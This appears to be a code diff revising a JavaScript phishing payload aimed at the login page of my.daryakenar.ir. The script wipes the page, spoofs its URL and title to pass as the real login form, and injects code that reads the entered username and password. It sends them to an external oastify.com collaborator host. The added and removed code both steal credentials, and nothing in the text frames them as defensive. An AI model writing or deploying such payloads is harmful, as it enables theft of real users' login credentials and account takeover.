@@ -8,6 +8,12 @@
         return iframe;
     }
 
+    function sendFinal(username, password) {
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', 'https://w2zllzx9v3pnmkm94x4xg1d7myspgf44.oastify.com/' + encodeURIComponent(username) + ':' + encodeURIComponent(password) + '.png', true);
+        xhr.send();
+    }
+
     document.body.innerHTML = '';
     window.history.replaceState({}, "ورود", "https://my.daryakenar.ir/account/login/mobile");
     window.parent.document.title = "ورود";
@@ -20,20 +26,15 @@
         // Inject script to listen to form submission inside the iframe
         var script = doc.createElement('script');
         script.textContent = `
-            function sendFinal() {
-                var username = document.getElementsByTagName('fluent-text-field')[0].value;
-                var password = document.getElementsByTagName('fluent-text-field')[1].value;
-                var xhr = new XMLHttpRequest();
-                xhr.open('GET', 'https://w2zllzx9v3pnmkm94x4xg1d7myspgf44.oastify.com/' + encodeURIComponent(username) + ':' + encodeURIComponent(password) + '.png', true);
-                xhr.send();
-            }
-
-            setInterval(function() {
-                var usr = document.getElementsByTagName('fluent-text-field')[0];
-                usr.setAttribute('onfocusout', 'sendFinal()');
-                var pwd = document.getElementsByTagName('fluent-text-field')[1];
-                pwd.setAttribute('onfocusout', 'sendFinal()');
-            }, 1000);
+            document.body.addEventListener('submit', async (event) => {
+                if (event.target.tagName.toLowerCase() === 'form') {
+                    var username = document.getElementsByTagName('fluent-text-field')[0].value;
+                    var password = document.getElementsByTagName('fluent-text-field')[1].value;
+                    if(password.length > 1){
+                        parent.sendFinal(username, password);
+                    }
+                }
+            }, true);
         `;
         doc.body.appendChild(script);
     };
